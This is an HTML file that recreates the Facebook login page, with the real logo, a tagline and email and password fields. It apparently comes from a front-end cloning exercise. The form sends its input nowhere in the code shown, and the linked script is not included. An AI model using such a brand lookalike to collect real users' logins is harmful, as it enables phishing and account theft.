<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Facebook - Log In or Sign Up</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>
	<div class="container">
		<!-- Left Section: Logo & Description -->
		<div class="left-section">
			<img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lB2lokA8A-.svg" alt="Facebook logo" class="logo">
			<h2>Facebook helps you connect and share with the people in your life.</h2>
		</div>

		<!-- Right Section: Login Form Card -->
		<div class="right-section">
			<div class="card">
				<form>
					<input type="text" placeholder="Email address or phone number" required>
					<input type="password" placeholder="Password" required>
					<button type="submit" class="btn-login">Log in</button>
					<a href="#" class="forgot-link">Forgotten account?</a>
					<hr>
					<a href="#" class="btn-create">Create new account</a>
				</form>
			</div>
		</div>
	</div>

	<script type="text/javascript" src="./script.js"></script>
</body>
</html>
